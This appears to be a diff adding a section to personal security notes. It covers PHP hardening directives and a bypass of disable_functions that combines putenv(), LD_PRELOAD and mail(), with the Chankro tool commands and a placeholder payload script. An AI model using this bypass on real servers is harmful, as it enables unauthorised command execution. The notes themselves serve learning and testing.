@@ -720,6 +720,45 @@ $ # docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'
 
 <hr class="sep-both">
 
+## PHP Security And Bypasses 🛡️
+
+<div class="row row-cols-lg-2"><div>
+
+#### PHP INI Configuration
+
+A few directives for your `php.ini` file:
+
+* **open_basedir** 🏠: when set, `fopen` or `include` can only open files within the defined base directory <small>(set it!)</small>.
+
+* **allow_url_fopen** and **allow_url_include** ✈️: determine if `fopen` and `include` respectively can open remote URLs <small>(No!)</small>.
+
+* **disable_functions** 💥: list of disabled functions. For instance, `shell_exec`, `exec`, `passthru`, `system` for command execution.
+</div><div>
+
+#### PHP mail() and putenv() Bypass
+
+Assuming we can write files to the disk, we can use `putenv()` to set [LD_PRELOAD](/cybersecurity/red-team/s4.privesc/linux/topics/sudo.md#ld_preload) and load it using a vulnerable function such as [mail](https://www.php.net/manual/en/function.mail.php).
+
+```php!
+// determine where files are uploaded with an initial script
+<?php echo "Current directory: " . getcwd(); ?>
+```
+
+```shell!
+$ git clone https://github.com/TarlogicSecurity/Chankro.git $HOME/tools/chankro
+```
+```bash!
+#!/bin/sh
+# payload.sh - your instructions, such as a reverse shell
+whoami > /path/to/uploaded/file/chankro_shell.out
+```
+```ps
+$ python $HOME/tools/chankro/chankro.py --arch 64 --input payload.sh --output filetoupload.php --path /path/to/uploaded/file/
+```
+</div></div>
+
+<hr class="sep-both">
+
 ## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
